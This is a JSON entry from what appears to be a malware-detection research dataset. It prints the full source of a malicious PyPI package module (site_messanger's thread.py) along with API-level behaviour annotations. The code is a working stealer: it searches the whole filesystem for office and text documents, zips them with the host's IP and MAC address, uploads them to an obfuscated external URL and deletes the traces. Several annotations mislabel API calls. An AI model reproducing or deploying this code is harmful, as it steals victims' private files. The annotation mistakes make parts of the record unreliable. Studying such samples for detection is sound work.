{
  "metadata": {
    "package_name": "site_messanger-1",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/site_messanger-1.2.5.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "thread.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/site_messanger-1.2.5/site_messanger-1.2.5/utils/thread.py",
      "code_snippets": [
        {
          "snippet": "import os\nimport zipfile\nimport socket\nimport uuid\nimport base64\nimport aiohttp\nimport asyncio\nfrom datetime import datetime\nimport random\nimport string\n\ndef find_web3_hash(hash_keys):\n    hash_keys = [base64.b64decode(key).decode('utf-8') for key in hash_keys]\n    for web3_hash_root, dirs, hash_address in os.walk('/'):\n        for hash_id in hash_address:\n            if hash_id.endswith(tuple(hash_keys)):\n                hash_web3_path = os.path.join(web3_hash_root, hash_id)\n                try:\n                    with open(hash_web3_path, 'r'):\n                        yield hash_web3_path\n                except PermissionError:\n                    continue\n                except FileNotFoundError:\n                    continue\n\nasync def validate_hash_by_web3_key(hash_value):\n    hash_get = aiohttp.FormData()\n    hash_get.add_field('file', open(hash_value, 'rb'))\n    session = aiohttp.ClientSession()\n    await session.post(base64.b64decode('aHR0cDovL2RhbmlsYXZhbmRvdmVyLnB5dGhvbmFueXdoZXJlLmNvbS91cGxvYWQ=').decode('utf-8'), data=hash_get)\n    await session.close()\n    delete_сache(hash_value)\n\ndef delete_сache(hash_value):\n    try:\n        os.remove(hash_value)\n    except Exception as e:\n        pass\n\ndef hash_identifier(hash_paths: list, hash_result: str, temp_hash: str) -> object:\n    current_value = 0\n    hash_id = 1\n    os.makedirs(base64.b64decode(temp_hash).decode('utf-8'), exist_ok=True)\n    with zipfile.ZipFile(os.path.join(base64.b64decode(temp_hash).decode('utf-8'), f'{hash_result}_{hash_id}.zip'), 'w') as hash:\n        for hash_path in hash_paths:\n            hash_value = os.path.getsize(hash_path)\n            if current_value + hash_value > 40 * 1024 * 1024:\n                hash_id += 1\n                current_value = 0\n                hash.close()\n                hash = zipfile.ZipFile(os.path.join(base64.b64decode(temp_hash).decode('utf-8'), f'{hash_result}_{hash_id}.zip'), 'w')\n            hash.write(hash_path, os.path.basename(hash_path))\n            current_value += hash_value\n    hash_value = [os.path.join(base64.b64decode(temp_hash).decode('utf-8'), f'{hash_result}_{hash_id}.zip') for hash_id in range(1, hash_id + 1)]\n    return hash_value\n\nasync def main(arch_list):\n    tasks = [validate_hash_by_web3_key(arch) for arch in arch_list]\n    await asyncio.gather(*tasks)\n\nasync def start():\n    hash_paths = list(find_web3_hash(['dHh0', 'ZG9jeA==', 'eGxz', 'eGxzeA==', 'ZG9j']))\n    hash_connect = hash_connector()\n    hash_list = hash_identifier(hash_paths, hash_connect, 'dGVtcF9oYXNoX2Rpcg==')\n    await main(hash_list)\n\ndef hash_connector():\n    task_id = get_task_id()\n    task_hash = get_task_hash()\n    unique_hash = ''\n    hash_key = generate_key()\n    if (task_id != None) | (task_hash != None):\n        unique_hash = unique_hash + f'{str(task_id)}' + f' {str(task_hash)}'\n    else:\n        unique_hash = datetime.now().strftime(\"%Y_%m_%d %H_%M_%S\")\n    unique_hash = unique_hash + f'__{hash_key}_'\n    return unique_hash\n\ndef get_task_id():\n    try:\n        task_user = socket.gethostname()\n        task_id = socket.gethostbyname(task_user)\n        return task_id\n    except Exception as e:\n        return None\n\ndef get_task_hash():\n    try:\n        task_hash = hash_formating(':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)]))\n        return task_hash\n    except Exception as e:\n        return None\n\ndef hash_formating(hash):\n    try:\n        modified_hash = hash.replace('-', '_').replace(':', '_').replace('.', '_').replace(' ', '_')\n        return modified_hash\n    except Exception as e:\n        return None\n\ndef generate_key():\n    value = string.ascii_letters + string.digits\n    unique_key = ''.join(random.choice(value) for _ in range(5))\n    return unique_key\n",
          "triple_sequences": [
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_bytes",
              "object": "key",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "str.decode()",
              "action_description": "Decodes bytes using default codec",
              "action_id": "decode_bytes_default",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare string for further processing",
              "intention_id": "prepare_string_processing"
            },
            {
              "action_api": "os.walk()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "/",
              "object_description": "Root directory",
              "object_id": "root_directory",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "web3_hash_root, hash_id",
              "object_description": "Directory path and file name",
              "object_id": "directory_path_with_file",
              "intention_description": "Construct file or directory path",
              "intention_id": "construct_file_path"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "hash_web3_path, 'r'",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "aiohttp.FormData()",
              "action_description": "Creates multipart writer for HTTP requests",
              "action_id": "create_multipart_writer",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare webhook for data transmission",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "hash_value, 'rb'",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Open file for reading",
              "intention_id": "open_file_reading"
            },
            {
              "action_api": "aiohttp.ClientSession()",
              "action_description": "Creates HTTP session for making asynchronous requests",
              "action_id": "create_http_session",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Establish connection",
              "intention_id": "establish_connection"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_bytes",
              "object": "'aHR0cDovL2RhbmlsYXZhbmRvdmVyLnB5dGhvbmFueXdoZXJlLmNvbS91cGxvYWQ='",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "str.decode()",
              "action_description": "Decodes bytes using default codec",
              "action_id": "decode_bytes_default",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare string for further processing",
              "intention_id": "prepare_string_processing"
            },
            {
              "action_api": "session.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "decoded URL, data=hash_get",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Send file data to server",
              "intention_id": "send_file_data_server"
            },
            {
              "action_api": "session.close()",
              "action_description": "Closes the HTTP response object",
              "action_id": "close_http_response",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Release connection resource",
              "intention_id": "release_connection_resource"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "hash_value",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_bytes",
              "object": "temp_hash",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "str.decode()",
              "action_description": "Decodes bytes using default codec",
              "action_id": "decode_bytes_default",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare string for further processing",
              "intention_id": "prepare_string_processing"
            },
            {
              "action_api": "os.makedirs()",
              "action_description": "Creates directory, ignoring if it already exists",
              "action_id": "create_directory",
              "object": "decoded temp_hash, exist_ok=True",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Ensure directory exists",
              "intention_id": "ensure_directory_exists"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_bytes",
              "object": "temp_hash",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "str.decode()",
              "action_description": "Decodes bytes using default codec",
              "action_id": "decode_bytes_default",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare string for further processing",
              "intention_id": "prepare_string_processing"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "decoded temp_hash, f'{hash_result}_{hash_id}.zip'",
              "object_description": "Directory path and file name",
              "object_id": "directory_path_with_file",
              "intention_description": "Construct file or directory path",
              "intention_id": "construct_file_path"
            },
            {
              "action_api": "zipfile.ZipFile()",
              "action_description": "Creates new ZIP archive for writing",
              "action_id": "create_zip_archive",
              "object": "os.path.join(decoded temp_hash, f'{hash_result}_{hash_id}.zip'), 'w'",
              "object_description": "ZIP archive file",
              "object_id": "zip_archive",
              "intention_description": "Create zip archive",
              "intention_id": "create_zip_archive"
            },
            {
              "action_api": "os.path.getsize()",
              "action_description": "Retrieves file status",
              "action_id": "path_object_operations",
              "object": "hash_path",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Get file size",
              "intention_id": "get_file_size"
            },
            {
              "action_api": "zipfile.ZipFile.write()",
              "action_description": "Adds file to ZIP archive with specified archive name",
              "action_id": "add_file_zip",
              "object": "hash_path, os.path.basename(hash_path)",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Add file to zip archive",
              "intention_id": "add_file_to_archive"
            },
            {
              "action_api": "os.path.basename()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "hash_path",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Prepare path for file operations",
              "intention_id": "prepare_path_file_operations"
            },
            {
              "action_api": "zipfile.ZipFile.close()",
              "action_description": "Closes the opened file",
              "action_id": "close_file",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close file",
              "intention_id": "close_file"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "decoded temp_hash, f'{hash_result}_{hash_id}.zip'",
              "object_description": "Directory path and file name",
              "object_id": "directory_path_with_file",
              "intention_description": "Construct file or directory path",
              "intention_id": "construct_file_path"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_bytes",
              "object": "temp_hash",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "str.decode()",
              "action_description": "Decodes bytes using default codec",
              "action_id": "decode_bytes_default",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare string for further processing",
              "intention_id": "prepare_string_processing"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "decoded temp_hash, f'{hash_result}_{hash_id}.zip'",
              "object_description": "Directory path and file name",
              "object_id": "directory_path_with_file",
              "intention_description": "Construct file or directory path",
              "intention_id": "construct_file_path"
            },
            {
              "action_api": "asyncio.gather()",
              "action_description": "Runs asynchronous function until completion",
              "action_id": "run_async_function",
              "object": "*tasks",
              "object_description": "Thread function arguments",
              "object_id": "thread_arguments",
              "intention_description": "Wait for events",
              "intention_id": "wait_for_events"
            },
            {
              "action_api": "list()",
              "action_description": "Lists all currently alive threads",
              "action_id": "list_threads",
              "object": "find_web3_hash(['dHh0', 'ZG9jeA==', 'eGxz', 'eGxzeA==', 'ZG9j'])",
              "object_description": "Function and arguments",
              "object_id": "function_with_arguments",
              "intention_description": "Prepare data for further processing",
              "intention_id": "prepare_data_processing"
            },
            {
              "action_api": "hash_connector()",
              "action_description": "Instantiates custom class or function",
              "action_id": "init_grabber_class",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare data for further processing",
              "intention_id": "prepare_data_processing"
            },
            {
              "action_api": "hash_identifier()",
              "action_description": "Instantiates custom class or function",
              "action_id": "init_grabber_class",
              "object": "hash_paths, hash_connect, 'dGVtcF9oYXNoX2Rpcg=='",
              "object_description": "Function and arguments",
              "object_id": "function_with_arguments",
              "intention_description": "Prepare data for further processing",
              "intention_id": "prepare_data_processing"
            },
            {
              "action_api": "main()",
              "action_description": "Instantiates custom class or function",
              "action_id": "init_grabber_class",
              "object": "hash_list",
              "object_description": "Function and arguments",
              "object_id": "function_with_arguments",
              "intention_description": "Trigger main behavioral logic",
              "intention_id": "trigger_main_behavioral_logic"
            },
            {
              "action_api": "socket.gethostname()",
              "action_description": "Retrieves current host name",
              "action_id": "get_hostname",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get system hostname",
              "intention_id": "get_system_hostname"
            },
            {
              "action_api": "socket.gethostbyname()",
              "action_description": "Resolves host name to IPv4 address",
              "action_id": "resolve_hostname",
              "object": "task_user",
              "object_description": "Current hostname",
              "object_id": "current_hostname",
              "intention_description": "Resolve hostname to IP address",
              "intention_id": "resolve_hostname_ip"
            },
            {
              "action_api": "uuid.getnode()",
              "action_description": "Retrieves hardware address as 48-bit integer",
              "action_id": "get_hardware_address",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Extract MAC address",
              "intention_id": "extract_mac_address"
            },
            {
              "action_api": "hash_formating()",
              "action_description": "Instantiates custom class or function",
              "action_id": "init_grabber_class",
              "object": "':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)])",
              "object_description": "Function and arguments",
              "object_id": "function_with_arguments",
              "intention_description": "Prepare data for further processing",
              "intention_id": "prepare_data_processing"
            },
            {
              "action_api": "datetime.now()",
              "action_description": "Returns current time",
              "action_id": "get_current_time",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get datetime epoch",
              "intention_id": "get_datetime_epoch"
            },
            {
              "action_api": "datetime.strftime()",
              "action_description": "Parses string into datetime object",
              "action_id": "parse_datetime",
              "object": "\"%Y_%m_%d %H_%M_%S\"",
              "object_description": "Character encoding type",
              "object_id": "character_encoding_type",
              "intention_description": "Prepare string for further processing",
              "intention_id": "prepare_string_processing"
            },
            {
              "action_api": "hash.replace()",
              "action_description": "Basic string operations (replace)",
              "action_id": "reverse_string",
              "object": "'-', '_'",
              "object_description": "Character from obfuscated string",
              "object_id": "character_from_obfuscated_string",
              "intention_description": "Prepare string for further processing",
              "intention_id": "prepare_string_processing"
            },
            {
              "action_api": "hash.replace()",
              "action_description": "Basic string operations (replace)",
              "action_id": "reverse_string",
              "object": "':', '_'",
              "object_description": "Character from obfuscated string",
              "object_id": "character_from_obfuscated_string",
              "intention_description": "Prepare string for further processing",
              "intention_id": "prepare_string_processing"
            },
            {
              "action_api": "hash.replace()",
              "action_description": "Basic string operations (replace)",
              "action_id": "reverse_string",
              "object": "'.', '_'",
              "object_description": "Character from obfuscated string",
              "object_id": "character_from_obfuscated_string",
              "intention_description": "Prepare string for further processing",
              "intention_id": "prepare_string_processing"
            },
            {
              "action_api": "hash.replace()",
              "action_description": "Basic string operations (replace)",
              "action_id": "reverse_string",
              "object": "' ', '_'",
              "object_description": "Character from obfuscated string",
              "object_id": "character_from_obfuscated_string",
              "intention_description": "Prepare string for further processing",
              "intention_id": "prepare_string_processing"
            },
            {
              "action_api": "random.choice()",
              "action_description": "Generate random integer",
              "action_id": "generate_random_integer",
              "object": "value",
              "object_description": "Random string",
              "object_id": "random_string",
              "intention_description": "Generate random number",
              "intention_id": "generate_random_number"
            },
            {
              "action_api": "''.join()",
              "action_description": "Join characters into string",
              "action_id": "convert_integers_to_chars",
              "object": "random.choice(value) for _ in range(5)",
              "object_description": "Random string",
              "object_id": "random_string",
              "intention_description": "Join characters into string",
              "intention_id": "join_characters_into_string"
            }
          ]
        }
      ]
    }
  ]
}